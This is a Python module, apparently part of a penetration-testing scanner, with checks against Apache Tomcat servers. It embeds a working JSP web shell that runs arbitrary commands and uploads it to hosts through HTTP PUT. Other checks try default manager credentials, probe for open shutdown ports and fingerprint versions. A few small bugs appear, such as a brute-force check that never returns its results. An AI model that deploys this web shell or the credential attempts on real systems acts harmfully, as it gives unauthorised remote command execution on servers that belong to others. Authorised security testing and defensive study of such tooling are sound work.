import re
import socket
import requests
import i18n
from src.utilities.utilities import error_handler, generate_random_string, get_default_context_execution2, Version_Vuln_Host_Data, get_header_from_url, get_url_response
from src.services.serviceclass import BaseServiceClass
from src.services.servicesubclass import BaseSubServiceClass, VersionSubService
import requests

cmd_jsp = """
<%@ page import="java.io.*,java.util.*" %>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
<form method="get">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
"""

class TomcatPutExploitSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("putexploit", "Bruteforce")

    @error_handler([])
    def nv(self, hosts, **kwargs) -> None:
        super().nv(hosts, kwargs=kwargs)
        
        results = get_default_context_execution2(f"Tomcat Put Exploit", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)

        if results:
            self.print_output("Apache Tomcat PUT exploit webshell paths:")
            for r in results:
                self.print_output(f"    {r}") # type: ignore

    @error_handler(["host"])
    def single(self, host, **kwargs):
        timeout=kwargs.get("timeout", 10)
        errors=kwargs.get("errors", False)
        verbose = kwargs.get("verbose", False)

        s = generate_random_string()
        requests.put(f"http://{host}/{s}", verify=False, data=cmd_jsp)

        return f"http://{host}/{s}?cmd=whoami"

class TomcatPuttestSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("puttest", "Bruteforce")

    @error_handler([])
    def nv(self, hosts, **kwargs) -> None:
        super().nv(hosts, kwargs=kwargs)
        
        results = get_default_context_execution2(f"Tomcat Put Test", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)

        if results:
            self.print_output("Apache Tomcat PUT/DELETE allowed on hosts:")
            for r in results:
                self.print_output(f"    {r}") # type: ignore

    @error_handler(["host"])
    def single(self, host, **kwargs):
        timeout=kwargs.get("timeout", 10)
        errors=kwargs.get("errors", False)
        verbose = kwargs.get("verbose", False)

        s = generate_random_string()
        requests.put(f"http://{host}/{s}", verify=False)
        requests.delete(f"http://{host}/{s}", verify=False)
        return host

class TomcatBruteforceSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("brute", "Bruteforce")

    @error_handler([])
    def nv(self, hosts, **kwargs) -> None:
        super().nv(hosts, kwargs=kwargs)
        
        results = get_default_context_execution2(f"Tomcat Bruteforce", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose, username="status", password="status")

        for r in results:
            self.print_output(f"{r[0]} is accessible by f{r[1]}:{r[2]}") # type: ignore

    @error_handler(["host"])
    def single(self, host, **kwargs):
        username=kwargs.get("username", "")
        password=kwargs.get("password", "")
        timeout=kwargs.get("timeout", 10)
        errors=kwargs.get("errors", False)
        verbose = kwargs.get("verbose", False)
        r = []

        # All these requires different built-in roles
        # It is possible 
        to_try = ["/manager/status", "/manager/html", "/manager/text/serverinfo", "/jmxproxy?get=java.lang:type=Memory&att=HeapMemoryUsage"]

        for u in to_try:
            try:
                resp = requests.get(f"http://{host}{u}", auth=(username, password), allow_redirects=False)
                if resp.status_code in [200]:
                    r.append([(f"http://{host}{u}", username, password)])
            except Exception as e:
                pass

class TomcatShutdownSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("shutdown", "Check shutdown")

    @error_handler([])
    def nv(self, hosts, **kwargs) -> None:
        super().nv(hosts, kwargs=kwargs)

        result = get_default_context_execution2(f"JMX Shutdown Port Check", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)

        if result:
            self.print_output("Port 8005 is open on these hosts, there is a chance that they are SHUTDOWN ports:")
            for r in result:
                self.print_output(f"    {r}")


    @error_handler(["host"])
    def single(self, host, **kwargs):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host.ip, 8005))
            sock.close()
            return host
        except:
            pass


class TomcatVersionSubServiceClass(VersionSubService):
    def __init__(self) -> None:
        super().__init__("version", "Checks version", [("Apache Tomcat", "apache-http-server")])

    @error_handler([])
    def nv(self, hosts, **kwargs) -> None:
        super().nv(hosts, kwargs=kwargs)
        
        results: list[Version_Vuln_Host_Data] = get_default_context_execution2(f"{self.products[0][0]} Version", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)
        versions = {}

        for r in results:
            if r.version not in versions:
                versions[r.version] = set()
            versions[r.version].add(r.host)

        if versions:
            versions = dict(sorted(versions.items(), reverse=True))
            self.print_output(i18n.t('main.version_title', name=self.products[0][0]))
            
            for key, value in versions.items():

                self.print_single_version_result("Apache Tomcat", value, key, "cpe:2.3:a:apache:http_server:")

            self.print_latest_versions()
            self.print_pocs()



    @error_handler(["host"])
    def single(self, host, **kwargs):
        timeout=kwargs.get("timeout", 10)
        errors=kwargs.get("errors", False)
        verbose = kwargs.get("verbose", False)
        version_regex = r"Apache/(.*)"
        header = get_header_from_url(host, "Server", timeout, errors, verbose)
        if header:
            m = re.search(version_regex, header)
            if m:
                m = m.group(1)
                if " " in m:
                    m = m.split()[0]
                return Version_Vuln_Host_Data(host, m)
        else:
            resp = get_url_response(host)
            version_regex = r"Apache Tomcat/(\d+\.\d+\.\d+)"
            m = re.search(version_regex, resp.text) # type: ignore
            if m:
                m = m.group(1)
                if " " in m:
                    m = m.split()[0]
                return Version_Vuln_Host_Data(host, m)



class TomcatServiceClass(BaseServiceClass):
    def __init__(self) -> None:
        super().__init__("tomcat")

        self.register_subservice(TomcatVersionSubServiceClass())
        self.register_subservice(TomcatBruteforceSubServiceClass())
        self.register_subservice(TomcatShutdownSubServiceClass())
        self.register_subservice(TomcatPuttestSubServiceClass())
        self.register_subservice(TomcatPutExploitSubServiceClass())